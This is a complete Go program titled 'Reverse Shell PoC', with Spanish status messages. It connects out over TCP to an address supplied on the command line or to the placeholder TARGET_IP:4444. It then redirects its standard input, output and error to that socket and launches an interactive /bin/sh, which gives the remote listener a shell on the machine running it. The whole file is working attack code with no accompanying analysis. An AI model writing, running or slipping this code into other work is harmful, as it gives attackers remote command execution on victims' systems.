package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	target := "TARGET_IP:4444"
	if len(os.Args) > 1 {
		target = os.Args[1]
	}

	fmt.Printf("[*] Reverse Shell PoC\n")
	fmt.Printf("[*] Conectando a %s...\n", target)

	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Conexión establecida\n")

	fd := conn.(*net.TCPConn)
	f, _ := fd.File()
	sockFd := int(f.Fd())

	syscall.Dup2(sockFd, 0)
	syscall.Dup2(sockFd, 1)
	syscall.Dup2(sockFd, 2)

	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
